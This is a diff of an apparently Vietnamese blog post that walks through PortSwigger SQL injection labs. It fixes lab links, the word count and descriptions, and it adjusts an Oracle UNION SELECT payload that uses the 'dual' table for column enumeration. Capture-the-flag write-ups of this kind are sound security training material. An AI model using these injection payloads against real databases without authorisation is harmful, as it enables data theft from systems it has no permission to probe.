@@ -37,7 +37,7 @@ SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1 Để g
                             "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","keywords": "portswigger, lab, ctf","wordcount":  933 ,
+                        }],"genre": "posts","keywords": "portswigger, lab, ctf","wordcount":  976 ,
         "url": "https:\/\/g03m0n.github.io\/posts\/portswigger-sqli\/portswigger-sqli\/","datePublished": "2024-01-20T08:29:01+08:00","dateModified": "2024-01-20T08:29:01+08:00","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
@@ -127,7 +127,7 @@ SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1 Để g
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PortSwigger - SQL Injection</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
 </span>&nbsp;<span class="post-category">included in <a href="/categories/portswigger/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>PortSwigger</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-20">2024-01-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;933 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-20">2024-01-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;976 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -308,15 +308,15 @@ Solved</p>
         alt="https://github.com/g03m0n/pics/assets/130943529/74fe5a4d-65f7-4d1d-89c6-504f56906344"
         title="image" /></p>
 <h2 id="3-sql-injection-attack-querying-the-database-type-and-version-on-oracle">3. SQL injection attack, querying the database type and version on Oracle</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle" target="_blank" rel="noopener noreffer">đây</a>
 </p>
 <p>Level: PRACTITIONER</p>
 <h3 id="description-2">Description</h3>
-<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.</p>
-<p>Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
 <h3 id="step-2">Step</h3>
 <p>Trong Oracle, built-in table có tên là <code>dual</code>, do vậy, ta có thể dò cột bằng cách sử dụng <code>UNION SELECT</code> và gọi <code>FROM</code> đến bảng <code>dual</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
 </span></span></code></pre></div><p>Lặp đi lặp lại câu lệnh, mỗi lần tăng số lượng <code>null</code>.
 Ta có thể tìm thấy số lượng cột chính xác bằng cách thêm <code>' UNION (select null, null)--</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">someTable</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> (<span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>) <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
@@ -348,10 +348,12 @@ Ta có thể tìm thấy số lượng cột chính xác bằng cách thêm <cod
         alt="https://github.com/g03m0n/pics/assets/130943529/6e71a454-3857-457f-9dae-605630d25a9c"
         title="image" /></p>
 <h2 id="4-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">4. SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" target="_blank" rel="noopener noreffer">đây</a>
 </p>
 <p>Level: PRACTITIONER</p>
 <h3 id="description-3">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
 <h3 id="step-3">Step</h3>
 <h2 id="5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">5. SQL injection attack, listing the database contents on non-Oracle databases</h2>
 <p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
